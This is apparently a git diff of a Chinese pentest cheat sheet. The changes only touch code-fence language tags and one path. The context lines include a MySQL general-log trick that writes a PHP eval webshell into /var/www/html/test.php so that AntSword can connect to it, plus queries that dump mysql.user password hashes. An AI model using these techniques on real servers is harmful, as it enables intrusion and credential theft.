@@ -257,19 +257,19 @@ sudo systemctl restart php7.0-fpm.service
 
 备份指定数据库：
 
-```mysql
+```sql
 mysqldump –u username –p password databasename > target.sql
 ```
 
 备份所有数据库：
 
-```mysql
+```sql
 mysqldump –all -databases > all.sql
 ```
 
 导入数据库：
 
-```mysql
+```sql
 mysql –u username –p password database < from.sql
 ```
 
@@ -278,20 +278,20 @@ mysql –u username –p password database < from.sql
 MySQL默认配置文件路径：
 
 ```
-C:\ Program Files\MySQL\MySQLServer 5.1\my.ini   //Windows
+C:\\Program Files\MySQL\MySQLServer 5.1\my.ini   //Windows
 /etc/my.cnf                                      //Linux
 /etc/mysql/my.cnf                                //Linux
 ```
 
 修改 `secure_file_priv` 参数（日志功能的对应目录）
 
-```mysql
+```sql
 secure_file_priv=""
 ```
 
 重载MySQL配置
 
-```mysql
+```sql
 FLUSH PRIVILEGES
 ```
 
@@ -657,21 +657,21 @@ while (1){
 
 1、查看MySQL版本
 
-```mysql
+```sql
 show variables like '%version%';
 select version();      #这个只显示MySQL版本号
 ```
 
 2、查看 `load_file()` 开启状态
 
-```mysql
+```sql
 show variables like '%secure%';       #这条可查看详细信息
 show global variables like '%secure_file_priv%';
 ```
 
 3、查看日志功能是否开启和对应目录
 
-```mysql
+```sql
 SHOW VARIABLES LIKE 'general%';
 set global general_log = "ON";
 set global general_log_file='/var/www/html/test.php';   #可以写入WebShell然后直接连接蚁剑
@@ -683,7 +683,7 @@ select '<?php @eval($_POST['AabyssTeam']);?>';
 
 小技巧：获取MySQL账户和对应密码Hash
 
-```mysql
+```sql
 # MySQL <= 5.6 版本
 select host, user, password from mysql.user;
 
